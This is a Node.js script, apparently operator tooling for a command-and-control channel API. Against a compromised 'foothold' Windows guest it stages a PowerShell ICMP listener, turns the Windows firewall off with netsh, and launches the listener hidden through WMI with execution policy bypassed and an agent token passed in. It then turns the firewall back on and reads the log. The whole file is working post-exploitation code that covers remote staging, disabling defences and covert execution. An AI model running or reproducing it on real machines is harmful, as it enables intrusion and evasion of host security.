// guest-fw-ab2.mjs <footholdId> — firewall A/B, take 2: renamed stage (the second
// WMI launch of the same file path silently no-runs on this guest — observed twice).
const API = 'http://127.0.0.1:8971';
const FOOTHOLD = process.argv[2];
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function j(path, body) {
  const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined);
  return r.json();
}
async function waitTask(agentId, taskId, s = 40) {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const x = (tasks || []).find((y) => y.taskId === taskId);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
}
const reg = await j('/api/channel/agent', { action: 'register', label: 'listen4-probe' });
console.log('probe identity:', reg.agentId);
await j('/api/channel/task', { agentId: reg.agentId, kind: 'note', data: 'fwab2-nonempty' });
const st = await j('/api/channel/stage', { agentId: FOOTHOLD, name: 'guest-icmp-l2b.ps1', b64: (await import('node:fs')).readFileSync(new URL('./guest-icmp-listen2.ps1', import.meta.url)).toString('base64') });
console.log('staged:', await waitTask(FOOTHOLD, st.taskId, 30));
const off = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'netsh advfirewall set allprofiles state off' });
console.log('FW OFF:', JSON.stringify(await waitTask(FOOTHOLD, off.taskId, 30)));
const wmi = "powershell -NoProfile -Command $r=Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\System32\agentbox\guest-icmp-l2b.ps1 -AgentId " + reg.agentId + " -Token " + reg.token + " -LogPath C:\Windows\Temp\icmp-l2b.log'}; $r.ReturnValue";
const lt = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: wmi });
console.log('launch:', await waitTask(FOOTHOLD, lt.taskId, 30));
await sleep(22000);
const on = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'netsh advfirewall set allprofiles state on' });
console.log('FW ON:', JSON.stringify(await waitTask(FOOTHOLD, on.taskId, 30)));
const t2 = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'type C:\Windows\Temp\icmp-l2b.log' });
console.log('L2B LOG:', JSON.stringify(await waitTask(FOOTHOLD, t2.taskId, 40)));
